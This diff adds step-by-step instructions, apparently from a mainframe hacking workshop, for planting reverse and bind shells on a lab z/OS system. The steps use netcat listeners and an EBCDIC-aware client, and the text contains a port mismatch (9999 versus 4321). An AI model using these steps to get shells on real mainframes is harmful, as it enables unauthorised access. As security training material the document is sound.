@@ -1,0 +1,84 @@
+FTP Shells to LABS folder
+- Connect to the mainframe with ftp: ftp <mainframe ip>
+- Enter your username and password when prompted
+- cd in to you LABS PDS: cd LABS
+- Upload USSREVC and either REVTSORX or REVUSSRX located in the 'Extra/Shells' folder
+
+*** OR ***
+
+Manualy Copy and Paste them, slowly:
+- Copy the following members from EVIL.SHELLS to <userid>.LABS:
+  - USSREVC
+  - REVTSORX *or* REVUSSRX (or both, if you have time)
+
+
+Edit and get the shell:
+REV[TSO/USS]RX: 
+ - Edit <userid>.LABS(REVTSORX) and/or <userid>.LABS(REVUSSRX)
+ - Replace 'IP =' with your IP address
+ - Save your changes
+ - in a Lab VM terminal run netcat listener on port 9999: nc -nlvp 4321
+ 
+ NOTE: Make sure everything here is correct. If not you'll be waiting a while for the script to time out
+
+ - On the Lab mainframe on the command line type (with the single quotes): 
+      TSO EX '<userid>.LABS(REVUSSRX)'
+             * or *
+      TSO EX '<userid>.LABS(REVTSORX)'
+ - in netcat you should see either a '$' or 'READY' prompt. Enjoy your shell. 
+   - REVUSSRX: Using uname try to get the name of the operating system (its not OS/390).
+   - REVTSORX: Using LU try and get your UNIX uid
+ - To exit hit CTLR-C in netcat 
+
+Quiz: Why do we need the single quotes? What happens without them?
+
+USSREVC
+ - Edit <userid>.LABS(USSREVC)
+ - Replace 'EVIL##' with your userid. If your user id is a single digit (EVIL1 through EVIL9) ad a trailing 0
+ - Replace all instances of <userid> with your userid with the command: CHANGE ALL <USERID> <userid> (e.g. CHANGE ALL <USERID> EVIL23)
+ - Replace <<YOUR IP>> with your actual IP address: CHANGE ALL '<<YOUR IP>>' <lab vm ip address> (e.g. CHANGE ALL '<<YOUR IP>>' 10.10.0.200)
+ - In a Lab VM terminal run netcat: nc -nlvp 31337
+ - On the Lab mainframe in the command field type 'sub' and hit enter
+ - Go back to you netcat terminal and wait
+   - NOTICE! See the garbage? ruhroh!
+   - IF YOU SEE MAXCC=0001 type the followling in the Command area: UNNUM;NUM OFF;SAVE;SUB
+ - in netcat hit CTRL-C to exit
+ - in this lab folder run the command: ./NetEBCDICat.py -l -p 31337 -d
+ - Go back to the Lab mainframe and submit the job again  
+ - Enter UNIX commands in your new C shell
+
+First person to tell me why we needed NetEBCDICat.py for the second example vs the REXX script gets a sticker! 
+
+--------------------------------------------------------------------------------------------------------
+BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * BONUS * 
+--------------------------------------------------------------------------------------------------------
+
+This is the same as above but with bind shells instead:
+
+Copy and paste these memebers as before. Change the values and create a bind shell. 
+
+BNDUSSRX/BNDTSORX:
+ - Edit <userid>.LABS(BNDTSORX) and/or <userid>.LABS(BNDUSSRX)
+ - change line 4 "p =  '555<user number>'". Replace <user number> with your number. 
+       i.e. EVIL31 would be "p = '55531'"
+ - Go to command line and type 'save' and hit enter
+ - type (with quotes): TSO EX '<userid>.LABS(BNDTSORX)' or TSO EX '<userid>.LABS(BNDUSSRX)'
+ - hit enter
+ - ** In a new Linux terminal ** type: nc <mf ip> 555<user number>
+ - BNDUSSRX: Type UNIX commands like id, date, pwd, ls /, etc
+   - Who can tell me whats wrong with this shell?
+ - BNDTSORX: Type TSO commands like lu, time, listds '<userid>.*', etc 
+ - To exit hit CTRL-C
+
+USSBINDC:
+ - Edit <userid>.LABS(USSBINDC)
+ - Replace all instances of <user> and <userid>:
+    - <user>: Line 1 and Line 29 (on line 29 just add your number to 555, this is the port you'll use)
+    - <userid> Line 12, Lines 44 - 48
+ - Go to the command line and type 'save; sub' and hit enter
+ - ** In a new Linux terminal ** type: nc -v <mf ip> 555<user number>
+    - Notice you get garbage on your screen. This is because it's EBCDIC
+ - hit CTRL-C
+ - In ISPF on the command line type 'sub' and hit enter
+ - In the Lab03 folder use NetEBCDICat.py to connect: ./NetEBCDICat.py -i <mf ip> -p 555<user number>
+ - You now have a proper UNIX shell!
